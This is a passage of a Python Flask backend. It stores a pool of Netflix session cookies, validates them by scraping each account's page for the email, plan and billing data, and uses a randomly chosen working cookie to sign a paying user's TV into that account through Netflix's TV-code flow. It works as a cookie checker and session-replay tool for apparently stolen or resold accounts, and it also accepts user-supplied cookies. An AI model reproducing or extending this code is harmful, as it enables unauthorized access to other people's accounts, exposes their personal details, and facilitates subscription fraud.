    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}"
    
    try:
        patch_resp = requests.patch(update_url, headers=headers, json=update_data, timeout=30)
        if patch_resp.status_code in [200, 204]:
            return True
        else:
            logger.error(f"Deactivate PATCH failed: {patch_resp.status_code} - {patch_resp.text[:200]}")
            return False
    except Exception as e:
        logger.error(f"Deactivate exception: {e}")
        return False

@app.route('/api/admin/account-stats', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def get_account_stats(user):
    """Get quick stats for super admin dashboard"""
    if request.method == 'OPTIONS':
        return '', 204

    try:
        headers = supabase_service_headers()

        # Total accounts
        total_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&limit=1", 
                                  headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        total = int(total_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in total_resp.headers.get('content-range', '') else 0

        # Active accounts
        active_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&limit=1", 
                                   headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        active = int(active_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in active_resp.headers.get('content-range', '') else 0

        # PH accounts
        ph_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&country=eq.PH&is_active=eq.true&limit=1", 
                               headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        ph_count = int(ph_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in ph_resp.headers.get('content-range', '') else 0

        # Premium accounts
        premium_resp = requests.get(f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_premium=eq.true&is_active=eq.true&limit=1", 
                                    headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        premium_count = int(premium_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in premium_resp.headers.get('content-range', '') else 0

        # Accounts needing recheck (not checked in 7 days)
        seven_days_ago = (datetime.utcnow() - timedelta(days=7)).isoformat()
        old_resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&last_checked=lt.{seven_days_ago}&is_active=eq.true&limit=1",
            headers={**headers, 'Prefer': 'count=exact'}, timeout=30)
        needs_recheck = int(old_resp.headers.get('content-range', '0-0/0').split('/')[1]) if '/' in old_resp.headers.get('content-range', '') else 0

        return jsonify({
            'status': 'success',
            'stats': {
                'total': total,
                'active': active,
                'inactive': total - active,
                'ph_accounts': ph_count,
                'premium_accounts': premium_count,
                'needs_recheck': needs_recheck,
                'last_updated': datetime.utcnow().isoformat()
            }
        })

    except Exception as e:
        logger.error(f"Stats error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500

# End of file - no more function definitions after routes

#--------------------------------------------------------------
def get_val(html, key):
    """Extract JSON value from Netflix HTML"""
    m = re.search(rf'"{re.escape(key)}"\s*:\s*"([^"]+)"', html)
    return m.group(1) if m else None

def get_auth_url(html):
    """Extract authURL from Netflix TV page"""
    input_match = re.search(r'name="authURL"\s+value="([^"]+)"', html)
    if input_match:
        return input_match.group(1)
    return get_val(html, "authURL")


def _legacy_tv_auth(user):
    """
    TV Device Authentication Flow — FIXED VERSION
    Based on working reference: GET /tv8 → extract authURL → POST /tv8 with payload
    """
    if request.method == 'OPTIONS':
        return '', 204

    try:
        data = request.get_json()
        code = data.get('code', '').strip()
        custom_netflix_id = data.get('netflix_id', '').strip()
        custom_secure_id = data.get('secure_netflix_id', '').strip()

        # Validate code format
        if not code or len(code) != 8 or not code.isdigit():
            return jsonify({
                'status': 'error',
                'message': 'TV code must be exactly 8 digits'
            }), 400

        # STEP 1: Get working Netflix credentials (both IDs required)
        netflix_id = None
        secure_netflix_id = None

        if custom_netflix_id:
            # Validate custom credentials first
            cookie_dict = {"NetflixId": custom_netflix_id}
            if custom_secure_id:
                cookie_dict["SecureNetflixId"] = custom_secure_id
            
            is_valid, info = validate_netflix_cookie_quick(cookie_dict)
            if not is_valid:
                return jsonify({
                    'status': 'error',
                    'message': f'Invalid NetflixId: {info.get("err", "Unknown error")}'
                }), 400
            netflix_id = custom_netflix_id
            secure_netflix_id = custom_secure_id
        else:
            # Find working stored account for this user WITH SecureNetflixId
            account = find_working_account_with_secure_id(user.id)
            if not account:
                return jsonify({
                    'status': 'error',
                    'message': 'No working Netflix accounts found with valid SecureNetflixId. Please check a cookie first.'
                }), 400
            netflix_id = account['netflix_id']
            secure_netflix_id = account.get('secure_netflix_id')

        # STEP 2: Build cookie string for headers
        cookie_str = f"NetflixId={netflix_id}"
        if secure_netflix_id:
            cookie_str += f"; SecureNetflixId={secure_netflix_id}"

        DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

        # ── Step 2a: GET /tv8 to extract authURL ──
        logger.info("Step 1: GET https://www.netflix.com/tv8")
        
        tv8_resp = requests.get(
            "https://www.netflix.com/tv8",
            headers={
                "User-Agent": DESKTOP_UA,
                "Cookie": cookie_str,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            },
            timeout=30,
            allow_redirects=False  # CRITICAL: Don't follow redirects, check status manually
        )

        # Check for redirect = expired cookie
        if tv8_resp.status_code in (301, 302, 303, 307):
            # Mark cookie as dead
            _mark_cookie_dead(netflix_id, "Cookie expired (redirect on /tv8)")
            return jsonify({
                'status': 'error',
                'message': 'Cookie expired. Please check a new cookie first.',
                'retry': True
            }), 400

        if tv8_resp.status_code != 200:
            _mark_cookie_dead(netflix_id, f"Status {tv8_resp.status_code} on /tv8")
            return jsonify({
                'status': 'error',
                'message': f'Failed to load TV page: HTTP {tv8_resp.status_code}',
                'retry': True
            }), 400

        html = tv8_resp.text

        # Check membership status from page
        membership_status = get_val(html, "membershipStatus")
        if membership_status and membership_status != "CURRENT_MEMBER":
            _mark_cookie_dead(netflix_id, f"Membership status: {membership_status}")
            return jsonify({
                'status': 'error',
                'message': f'Cookie does not have active subscription. Status: {membership_status}',
                'retry': True
            }), 400

        # Extract authURL — THIS IS THE KEY
        auth_url = get_auth_url(html)
        if not auth_url:
            logger.error(f"Could not extract authURL. HTML snippet: {html[:2000]}")
            return jsonify({
                'status': 'error',
                'message': 'Could not extract authURL from Netflix. Netflix may have changed their page.'
            }), 500

        logger.info(f"Extracted authURL: {auth_url[:50]}...")

        # ── Step 2b: POST /tv8 with the activation payload ──
        logger.info(f"Step 2: POST /tv8 with code {code[:2]}****")
        
        payload = {
            "flow": "websiteSignUp",
            "authURL": auth_url,
            "flowMode": "enterTvLoginRendezvousCode",
            "withFields": "tvLoginRendezvousCode,isTvUrl2",
            "tvLoginRendezvousCode": code,
            "action": "nextAction",
        }

        activate_resp = requests.post(
            "https://www.netflix.com/tv8",
            headers={
                "User-Agent": DESKTOP_UA,
                "Cookie": cookie_str,
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.netflix.com/tv8",
                "Origin": "https://www.netflix.com",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            },
            data=urllib.parse.urlencode(payload),
            timeout=30,
            allow_redirects=False  # CRITICAL: Check redirect location manually
        )

        # ── Step 3: Parse result based on response ──
        success = False
        result_message = ""

        if activate_resp.status_code in (301, 302, 303, 307):
            location = activate_resp.headers.get("Location", "")
            logger.info(f"POST redirect to: {location}")
            
            if "/tv/out/success" in location or "success" in location.lower():
                success = True
                result_message = "TV activated successfully! Your TV should be signed in within 10-30 seconds."
            elif "/login" in location or "signin" in location.lower():
                _mark_cookie_dead(netflix_id, "Session dropped during TV activation")
                return jsonify({
                    'status': 'error',
                    'message': 'Session dropped while activating. The cookie may have expired.',
                    'retry': True
                }), 400
            else:
                result_message = f"Unexpected redirect: {location}"
                logger.warning(f"Unexpected redirect location: {location}")
        else:
            # Check response body for error messages
            err_text = activate_resp.text
            
            # Look for Netflix error message div
            nf_message_match = re.search(
                r'class="nf-message-contents"[^>]*>([\s\S]*?)<\/div>',
                err_text
            )
            if nf_message_match:
                result_message = re.sub(r'<[^>]+>', '', nf_message_match.group(1)).strip()
            else:
                # Check for other error indicators
                if "invalid" in err_text.lower() and "code" in err_text.lower():
                    result_message = "Invalid TV code. Please generate a new code on your TV."
                elif "expired" in err_text.lower():
                    result_message = "TV code has expired. Please generate a new one on your TV."
                elif "maximum" in err_text.lower() and "device" in err_text.lower():
                    result_message = "Maximum number of devices reached for this account."
                else:
                    result_message = "Failed to activate TV. Please check the code and try again."
            
            logger.warning(f"TV activation failed. Status: {activate_resp.status_code}, Message: {result_message}")
            logger.debug(f"Response body: {err_text[:1000]}")

        # Log the attempt
        log_tv_auth_attempt(user.id, code, "success" if success else "failed", request.remote_addr)

        if success:
            return jsonify({
                'status': 'success',
                'message': result_message
            })
        else:
            return jsonify({
                'status': 'error',
                'message': result_message
            }), 400

    except requests.RequestException as e:
        logger.error(f"Network error in TV auth: {str(e)}")
        return jsonify({'status': 'error', 'message': f'Network error: {str(e)}'}), 500
    except Exception as e:
        logger.error(f"TV auth exception: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'Error: {str(e)}'}), 500


def _mark_cookie_dead(netflix_id, reason):
    """Mark a cookie as dead in the database"""
    try:
        supabase.table('netflix_accounts')\
            .update({
                'is_active': False,
                'deactivated_reason': reason,
                'deactivated_at': datetime.utcnow().isoformat()
            })\
            .eq('netflix_id', netflix_id)\
            .execute()
    except Exception as e:
        logger.error(f"Failed to mark cookie as dead: {e}")



def find_working_account_with_secure_id(user_id):
    """Backward-compatible helper using the same randomized shared TV pool."""
    try:
        for account in _get_random_tv_candidates(get_viewer_country()):
            is_valid, info = validate_netflix_cookie_quick({
                'NetflixId': account['netflix_id'],
                'SecureNetflixId': account['secure_netflix_id']
            })
            _record_tv_validation(account, is_valid, info)
            if is_valid:
                return account
    except Exception as exc:
        logger.error(f'Error finding account with secure ID: {exc}')

    return None


def log_tv_auth_attempt(user_id, code, status, ip_address):
    """Log TV authentication attempts"""
    try:
        headers = supabase_service_headers('return=representation')

        log_data = {
            'user_id': str(user_id),
            'tv_code': code[:4] + '****',
            'status': status,
            'ip_address': str(ip_address) if ip_address else None
        }

        url = f"{SUPABASE_URL}/rest/v1/tv_auth_logs"
        resp = requests.post(url, headers=headers, json=log_data)

        if resp.status_code == 201:
            logger.info(f"TV auth log SUCCESS")
        else:
            logger.error(f"TV auth log FAILED: {resp.status_code}")

    except Exception as e:
        logger.error(f"TV auth log error: {str(e)}")

def validate_netflix_cookie_quick(cookie_dict):
    """
    Quick validation of Netflix cookies. Accepts dict with NetflixId and optionally SecureNetflixId.
    Returns (is_valid, account_info_or_error)
    """
    session = requests.Session()
    session.cookies.update(cookie_dict)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        resp = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15)
        txt = resp.text
        txt_lower = txt.lower()

        if resp.status_code == 429:
            return False, {
                'err': 'Temporary Netflix rate limit; keep the account active and retry later',
                'needs_recheck': True
            }
        if resp.status_code == 403:
            return False, {
                'err': 'Temporary Netflix access block; keep the account active and retry later',
                'needs_recheck': True
            }
        if resp.status_code >= 500:
            return False, {
                'err': f'Temporary Netflix server error (HTTP {resp.status_code})',
                'needs_recheck': True
            }
        
        # Check for login redirect
        if '"mode":"login"' in txt_lower or 'signin' in resp.url.lower():
            missing_secure = not cookie_dict.get('SecureNetflixId')
            return False, {
                'err': 'Cookie expired - redirected to login' + (' (missing SecureNetflixId?)' if missing_secure else ''),
                'needs_recheck': True
            }
        
        # Check for account page
        if '"mode":"yourAccount"' not in txt:
            if 'payment' in txt_lower and ('update' in txt_lower or 'required' in txt_lower):
                return False, {'err': 'Payment method update required'}
            if 'membership has been canceled' in txt_lower:
                return False, {'err': 'Membership cancelled'}
            if 'restart' in txt_lower and 'membership' in txt_lower:
                return False, {'err': 'Membership expired'}
            if 'unauthorized' in txt_lower or 'session expired' in txt_lower:
                return False, {'err': 'Session expired'}
            if 'on hold' in txt_lower:
                return False, {'err': 'Membership on hold'}
            return False, {'err': 'Not logged in - invalid cookie'}
        
        # Check membership status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        if not status_match:
            return False, {
                'err': 'Temporary membership status unavailable; retry later',
                'needs_recheck': True
            }
        status = status_match.group(1)
        if status != 'CURRENT_MEMBER':
            return False, {'err': f'Membership status: {status}'}

        billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', txt)
        next_billing_raw = billing_match.group(1) if billing_match else None
        next_billing_date, days_until_billing = parse_next_billing_date(
            next_billing_raw
        )
        if days_until_billing is not None and days_until_billing < 0:
            return False, {
                'err': f'Renewal date has passed: {next_billing_date}',
                'is_expired': True,
                'next_billing_date': next_billing_date,
                'days_until_billing': days_until_billing
            }
        
        # Extract basic info
        email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', txt)
        email = email_match.group(1) if email_match else 'Unknown'
        
        country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', txt)
        country = country_match.group(1) if country_match else 'Unknown'
        
        plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', txt)
        plan = plan_match.group(1) if plan_match else 'Unknown'
        
        is_premium = '"isuhdavailable":true' in txt_lower or 'premium' in plan.lower()
        
        return True, {
            'email': email,
            'country': country,
            'plan': plan,
            'is_premium': is_premium,
            'next_billing_date': next_billing_date,
            'days_until_billing': days_until_billing
        }
        
    except requests.RequestException as e:
        return False, {'err': f'Network error: {str(e)}'}
    except Exception as e:
        return False, {'err': f'Validation error: {str(e)}'}


TV_DESKTOP_UA = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
    'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
)


def _tv_env_int(name, default, minimum, maximum):
    try:
        value = int(os.environ.get(name, str(default)))
    except (TypeError, ValueError):
        value = default
    return max(minimum, min(value, maximum))


def _tv_service_headers(prefer='return=minimal'):
    return supabase_service_headers(prefer)


def _tv_account_summary(account):
    """Return only display-safe account data; never return Netflix cookies."""
    return {
        'id': account.get('id'),
        'email': account.get('email') or 'Unknown',
        'country': account.get('country') or 'Unknown',
        'plan': account.get('plan') or account.get('subscription_type') or 'Unknown',
        'renewal': account.get('next_billing_date')
    }


def _get_random_tv_candidates(viewer_country):
    """Fetch the shared active pool and randomize it for each TV-login request."""
    pool_limit = _tv_env_int('TV_AUTH_POOL_LIMIT', 1000, 1, 1000)
    params = {
        'select': (
            'id,email,country,plan,subscription_type,netflix_id,secure_netflix_id,'
            'days_until_billing,next_billing_date,last_checked'
        ),
        'is_active': 'eq.true',
        'is_premium': 'eq.true',
        'is_expired': 'eq.false',
        'netflix_id': 'not.is.null',
        'secure_netflix_id': 'not.is.null',
        'limit': str(pool_limit)
    }
    response = requests.get(
        f'{SUPABASE_URL}/rest/v1/netflix_accounts',
        headers=_tv_service_headers(),
        params=params,
        timeout=20
    )
    if response.status_code != 200:
        raise RuntimeError(f'Unable to load the TV account pool ({response.status_code})')

    candidates = []
    for account in response.json():
        if not account.get('netflix_id') or not account.get('secure_netflix_id'):
            continue
        days_left = account.get('days_until_billing')
        if days_left is not None and days_left < 0:
            continue
        _, region_compatible = get_region_compatibility(
            account.get('plan'), account.get('subscription_type'), viewer_country
        )
        if region_compatible is False:
            continue
        candidates.append(account)

    random.SystemRandom().shuffle(candidates)
    return candidates


def _tv_candidate_priority(account):
    """PH Premium first, US Premium second, then every other active plan."""
    country = str(account.get('country') or '').strip().upper()
    if country in ('PHILIPPINES', 'PILIPINAS'):
        country = 'PH'
    elif country in ('UNITED STATES', 'UNITED STATES OF AMERICA', 'USA'):
        country = 'US'
    plan_text = ' '.join((
        str(account.get('plan') or ''),
        str(account.get('subscription_type') or '')
    )).lower()
    is_premium_plan = 'premium' in plan_text
    if country == 'PH' and is_premium_plan:
        return 0, 'PH Premium'
    if country == 'US' and is_premium_plan:
        return 1, 'US Premium'
    return 2, 'Other active subscription'


def _prioritized_tv_candidates(candidates, per_tier, prefer_recent=False):
    """Randomize within each priority tier and guarantee fallback tiers get attempts."""
    tiers = {0: [], 1: [], 2: []}
    for account in candidates:
        priority, _ = _tv_candidate_priority(account)
        tiers[priority].append(account)

    secure_random = random.SystemRandom()
    selected = []
    for priority in (0, 1, 2):
        secure_random.shuffle(tiers[priority])
        if prefer_recent:
            # Stable sorting preserves random order inside fresh/stale groups.
            tiers[priority].sort(
                key=lambda account: not _account_was_recently_validated(account)
            )
        selected.extend(tiers[priority][:per_tier])
    return selected


def _record_tv_validation(account, is_valid, info):
    """Persist TV pre-check results without killing accounts on temporary network errors."""
    account_id = account.get('id')
    if not account_id:
        return

    now = datetime.now(timezone.utc).isoformat()
    if is_valid:
        update_data = {
            'last_checked': now,
            'validation_status': 'working',
            'last_validation_error': None,
            'consecutive_failures': 0,
            'is_active': True,
            'is_expired': False,
            'deactivated_reason': None,
            'deactivated_at': None
        }
        if info.get('email') and info.get('email') != 'Unknown':
            update_data['email'] = info['email']
        if info.get('country') and info.get('country') != 'Unknown':
            update_data['country'] = info['country']
        if info.get('plan') and info.get('plan') != 'Unknown':
            update_data['plan'] = info['plan']
        if info.get('next_billing_date'):
            update_data['next_billing_date'] = info['next_billing_date']
        if info.get('days_until_billing') is not None:
            update_data['days_until_billing'] = info['days_until_billing']
    else:
        health_status, reason = classify_account_health({'ok': False, **(info or {})})
        update_data = {
            'last_checked': now,
            'validation_status': health_status,
            'last_validation_error': reason
        }
        if health_status in ('expired', 'dead'):
            update_data.update({
                'is_active': False,
                'is_premium': False,
                'is_expired': health_status == 'expired',
                'deactivated_reason': reason,
                'deactivated_at': now
            })
        # Unknown/network failures are recorded but the account stays active.

    try:
        patch_account_health(account_id, update_data, _tv_service_headers())
    except Exception as exc:
        logger.error(f'Unable to save TV validation for account {account_id}: {exc}')


def _prepare_tv_candidate(account):
    """Confirm the candidate can load Netflix TV login and return its live session/authURL."""
    session = requests.Session()
    session.cookies.update({
        'NetflixId': account['netflix_id'],
        'SecureNetflixId': account['secure_netflix_id']
    })
    session.headers.update({
        'User-Agent': TV_DESKTOP_UA,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9'
    })

    try:
        response = session.get(
            'https://www.netflix.com/tv8', timeout=15, allow_redirects=False
        )
    except requests.RequestException as exc:
        return 'transient', f'Network error loading TV login: {exc}', None

    if response.status_code in (301, 302, 303, 307, 308):
        location = response.headers.get('Location', '')
        return 'invalid', f'Cookie expired (TV login redirected to {location or "login"})', None
    if response.status_code == 429 or response.status_code >= 500:
        return 'transient', f'Netflix TV login temporarily returned HTTP {response.status_code}', None
    if response.status_code != 200:
        return 'transient', f'Netflix TV login returned HTTP {response.status_code}', None

    membership_status = get_val(response.text, 'membershipStatus')
    if membership_status and membership_status != 'CURRENT_MEMBER':
        return 'invalid', f'Membership status: {membership_status}', None

    auth_url = get_auth_url(response.text)
    if not auth_url:
        return 'transient', 'Netflix TV page did not provide an authURL', None

    return 'ready', None, {'session': session, 'auth_url': auth_url}


def _activate_tv_candidate(prepared, code):
    """Submit the TV code and say whether another account may safely be attempted."""
    payload = {
        'flow': 'websiteSignUp',
        'authURL': prepared['auth_url'],
        'flowMode': 'enterTvLoginRendezvousCode',
        'withFields': 'tvLoginRendezvousCode,isTvUrl2',
        'tvLoginRendezvousCode': code,
        'action': 'nextAction'
    }
    try:
        response = prepared['session'].post(
            'https://www.netflix.com/tv8',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.netflix.com/tv8',
                'Origin': 'https://www.netflix.com'
            },
            data=urllib.parse.urlencode(payload),
            timeout=20,
            allow_redirects=False
        )
    except requests.RequestException as exc:
        return 'system_error', f'Network error submitting TV code: {exc}', False

    if response.status_code in (301, 302, 303, 307, 308):
        location = response.headers.get('Location', '')
        lowered_location = location.lower()
        if '/tv/out/success' in lowered_location or 'success' in lowered_location:
            return (
                'success',
                'TV activated successfully! Your TV should sign in within 10-30 seconds.',
                False
            )
        if '/login' in lowered_location or 'signin' in lowered_location:
            return 'account_failure', 'Account session expired during TV activation', True
        return 'code_error', f'Netflix returned an unexpected TV response: {location}', False

    body = response.text or ''
    body_lower = body.lower()
    message_match = re.search(
        r'class="nf-message-contents"[^>]*>([\s\S]*?)</div>', body
    )
    message = (
        re.sub(r'<[^>]+>', '', message_match.group(1)).strip()
        if message_match else ''
    )

    if 'maximum' in body_lower and 'device' in body_lower:
        return 'account_failure', message or 'Maximum devices reached for this account', False
    if ('invalid' in body_lower and 'code' in body_lower) or 'incorrect code' in body_lower:
        return 'code_error', message or 'Invalid TV code. Generate a new code on your TV.', False
    if 'expired' in body_lower and 'code' in body_lower:
        return 'code_error', message or 'TV code expired. Generate a new code on your TV.', False
    if response.status_code == 429 or response.status_code >= 500:
        return 'system_error', message or f'Netflix temporarily returned HTTP {response.status_code}', False
    return 'code_error', message or 'Netflix rejected the TV code. Generate a new code and try again.', False


@app.route('/api/tv-auth', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def tv_auth(user):
    """Randomly select and verify a working account before linking a TV."""
    if request.method == 'OPTIONS':
        return '', 204
    if not has_premium_access(user.id):
        return jsonify({'status': 'error', 'message': 'Premium subscription required'}), 403

    data = request.get_json(silent=True) or {}
    code = str(data.get('code') or '').strip()
    custom_netflix_id = str(data.get('netflix_id') or '').strip()
    custom_secure_id = str(data.get('secure_netflix_id') or '').strip()
    if not re.fullmatch(r'\d{8}', code):
        return jsonify({'status': 'error', 'message': 'TV code must be exactly 8 digits'}), 400
    if bool(custom_netflix_id) != bool(custom_secure_id):
        return jsonify({
            'status': 'error',
            'message': 'Both NetflixId and SecureNetflixId are required for a custom account'
        }), 400

    max_attempts = _tv_env_int('TV_AUTH_MAX_ACCOUNT_ATTEMPTS', 8, 1, 25)
    total_timeout = _tv_env_int('TV_AUTH_TOTAL_TIMEOUT_SECONDS', 45, 15, 120)
    started_at = time.monotonic()
    viewer_country = get_viewer_country()

    if custom_netflix_id:
        candidates = [{
            'id': None,
            'email': 'Custom account',
            'country': 'Unknown',
            'plan': 'Unknown',
            'netflix_id': custom_netflix_id,
            'secure_netflix_id': custom_secure_id
        }]
        max_attempts = 1
    else:
        try:
            candidates = _get_random_tv_candidates(viewer_country)
        except Exception as exc:
            logger.exception('Unable to load TV candidates')
            return jsonify({'status': 'error', 'message': str(exc)}), 500
        if not candidates:
            return jsonify({
                'status': 'error',
                'message': 'No active TV-compatible accounts with SecureNetflixId are available'
            }), 400

    attempts = 0
    skipped_reasons = []
    for account in candidates[:max_attempts]:
        if attempts and time.monotonic() - started_at >= total_timeout:
            break
        attempts += 1
        cookie_dict = {
            'NetflixId': account['netflix_id'],
            'SecureNetflixId': account['secure_netflix_id']
        }
        is_valid, info = validate_netflix_cookie_quick(cookie_dict)
        if account.get('id'):
            _record_tv_validation(account, is_valid, info)
        if not is_valid:
            reason = (info or {}).get('err', 'Cookie validation failed')
            skipped_reasons.append(reason)
            if custom_netflix_id:
                return jsonify({'status': 'error', 'message': f'Custom account is invalid: {reason}'}), 400
            continue

        prepare_status, prepare_reason, prepared = _prepare_tv_candidate(account)
        if prepare_status != 'ready':
            skipped_reasons.append(prepare_reason)
            if prepare_status == 'invalid' and account.get('id'):
                _record_tv_validation(account, False, {'err': prepare_reason})
            if custom_netflix_id:
                return jsonify({'status': 'error', 'message': prepare_reason}), 400
            continue

        result_status, message, deactivate = _activate_tv_candidate(prepared, code)
        if result_status == 'success':
            log_tv_auth_attempt(user.id, code, 'success', request.remote_addr)
            return jsonify({
                'status': 'success',
                'message': message,
                'account_used': _tv_account_summary(account),
                'accounts_checked': attempts
            })
        if result_status == 'account_failure' and not custom_netflix_id:
            skipped_reasons.append(message)
            if deactivate and account.get('id'):
                _record_tv_validation(account, False, {'err': message})
            continue

        log_tv_auth_attempt(user.id, code, 'failed', request.remote_addr)
        return jsonify({
            'status': 'error',
            'message': message,
            'accounts_checked': attempts
        }), 503 if result_status == 'system_error' else 400

    log_tv_auth_attempt(user.id, code, 'no_working_account', request.remote_addr)
    timed_out = time.monotonic() - started_at >= total_timeout
    message = (
        f'No usable account was found before the {total_timeout}-second safety limit.'
        if timed_out else f'No usable account was found after checking {attempts} random account(s).'
    )
    return jsonify({
        'status': 'error',
        'message': message,
        'accounts_checked': attempts,
        'retry': True,
        'details': skipped_reasons[-3:]
    }), 503 if timed_out else 400

#--------------------------------------------------------------

if __name__ == '__main__':
    app.run(debug=True)
